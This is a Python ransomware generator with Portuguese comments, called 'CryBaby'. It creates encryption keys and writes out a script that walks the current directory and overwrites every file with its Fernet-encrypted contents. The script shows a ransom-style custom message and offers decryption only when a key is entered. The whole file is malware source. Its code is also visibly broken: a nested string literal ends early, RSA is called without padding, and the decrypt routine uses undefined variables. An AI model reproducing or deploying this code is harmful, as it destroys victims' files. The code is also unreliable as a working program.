import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import subprocess  # Importa a biblioteca subprocess
import uuid

def gerar_chave_simetrica():
    # Gera uma chave de criptografia simétrica aleatória
    return Fernet.generate_key()

def gerar_chave_assimetrica():
    # Gera um par de chaves assimétricas (pública e privada)
    chave_privada = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    chave_publica = chave_privada.public_key()

    # Converte as chaves para o formato PEM
    chave_privada_pem = chave_privada.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    chave_publica_pem = chave_publica.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    return chave_privada_pem, chave_publica_pem

def criptografar_chave(chave_simetrica, chave_publica_pem):
    chave_publica = serialization.load_pem_public_key(chave_publica_pem)

    chave_simetrica_criptografada = chave_publica.encrypt(
        chave_simetrica,
        padding=None  # Usamos None para criptografia assimétrica pura (sem padding)
    )

    return base64.urlsafe_b64encode(chave_simetrica_criptografada).decode()

def instalar_dependencias():
    try:
        subprocess.check_call(["pip", "install", "cryptography"])
        print("Bibliotecas instaladas com sucesso.")
    except subprocess.CalledProcessError:
        print("Erro ao instalar bibliotecas. Verifique sua conexão com a internet e tente novamente.")

def main():
    instalar_dependencias()

    chave_simetrica = gerar_chave_simetrica()
    chave_privada_pem, chave_publica_pem = gerar_chave_assimetrica()

    chave_simetrica_criptografada = criptografar_chave(chave_simetrica, chave_publica_pem)

    print("Chave simétrica criptografada:")
    print(chave_simetrica_criptografada)

    print("Chave privada (mantenha em segurança!):")
    print(chave_privada_pem.decode())

    mensagem_personalizada = input("Digite uma mensagem personalizada para mostrar após a descriptografia: ")

    nome_referencia_unica = str(uuid.uuid4())

    script_crybaby = f'''
import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization

chave_publica_pem = b'''
{repr(base64.b64encode(chave_publica_pem).decode('utf-8'))}

'''

nome_referencia = "{nome_referencia_unica}"
mensagem_personalizada = "{mensagem_personalizada}"

# Resto do código do CryBaby.py continua aqui...

chave_simetrica = "{chave_simetrica}"
mensagem_personalizada = "{mensagem_personalizada}"
fernet = Fernet(chave_simetrica)

def criptografar_arquivos(arquivos):
    for arquivo in arquivos:
        with open(arquivo, 'rb') as file:
            conteudo = file.read()

        # Criptografa o conteúdo do arquivo
        conteudo_criptografado = fernet.encrypt(conteudo)

        # Sobrescreve o arquivo original com o conteúdo criptografado
        with open(arquivo, 'wb') as file:
            file.write(conteudo_criptografado)

def descriptografar_arquivos(arquivos):
    chave_privada = serialization.load_pem_private_key(
        chave_privada_pem,
        password=None
    )

    chave_simetrica_criptografada = base64.urlsafe_b64decode(chave_simetrica_criptografada.encode())
    chave_simetrica = chave_privada.decrypt(
        chave_simetrica_criptografada,
        padding=None  # Usamos None para criptografia assimétrica pura (sem padding)
    )

    fernet = Fernet(chave_simetrica)

    chave_descriptografar = input("Digite a chave para descriptografar os arquivos: ")

    if chave_descriptografar == chave_simetrica.decode():
        for arquivo in arquivos:
            with open(arquivo, 'rb') as file:
                conteudo_criptografado = file.read()

            # Descriptografa o conteúdo do arquivo
            conteudo_descriptografado = fernet.decrypt(conteudo_criptografado)

            # Sobrescreve o arquivo original com o conteúdo descriptografado
            with open(arquivo, 'wb') as file:
                file.write(conteudo_descriptografado)
        
        print(mensagem_personalizada)
    else:
        print("Chave incorreta. Não é possível descriptografar os arquivos.")

if __name__ == "__main__":
    arquivos_para_criptografar = []
    for root, dirs, files in os.walk('.'):
        for file in files:
            caminho_absoluto = os.path.join(root, file)
            if caminho_absoluto != os.path.abspath(__file__):
                arquivos_para_criptografar.append(caminho_absoluto)

    criptografar_arquivos(arquivos_para_criptografar)

    with open("CryBaby.py", "w") as file:
        file.write(script_crybaby)

    print("Arquivos criptografados com sucesso.")

    opcao = input("Deseja descriptografar os arquivos? (s/n): ")
    if opcao.lower() == "s":
        descriptografar_arquivos(arquivos_para_criptografar)
    else:
        print("Atenção: Os arquivos permanecerão criptografados. Guarde a chave privada em segurança.")
